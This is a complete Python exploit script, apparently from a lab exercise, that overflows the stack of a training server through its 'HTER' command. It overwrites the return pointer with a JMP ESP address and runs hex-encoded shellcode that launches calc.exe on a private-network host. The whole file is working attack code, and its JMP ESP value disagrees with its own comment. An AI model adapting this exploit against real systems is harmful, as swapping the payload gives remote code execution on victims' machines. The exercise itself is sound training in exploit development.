#!/usr/bin/python
import socket,sys,struct

RHOST = "192.168.57.144" # Remote IP
RPORT = 9999 # Remote port

buf_totlen = 5000 # Total length of buffer (payload)
offset_srp = 2041 # Offset to saved return pointer; the overflow directly overwrites EIP

ptr_jmp_esp = "af115062" # Pointer to JMP ESP in essfunc.dll; 0x625011C7

# From: WinExec-calc.nasm
# WinExec(LPCSTR "cmd.exe /c calc.exe", UINT 0)
# ExitProcess(UINT 0)
calc = ""
calc += "eb175e31d25288561356b8ad23867cff"
calc += "d052b8e8c0807cffd0e8e4ffffff636d"
calc += "642e657865202f632063616c632e6578"
calc += "654e"

buf = ""
buf += "A" * (offset_srp - len(buf)) # Fills to offset_srp (2041) with 'A'
buf += ptr_jmp_esp # SRP overwrite with mem. addr. of JMP ESP
buf += calc # Payload of calc.exe; directly follows SRP on stack
buf += "B" * (buf_totlen - len(buf)) # Fills rest of buffer with 'B'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

s.send("HTER " + buf + ":\\")
s.close()

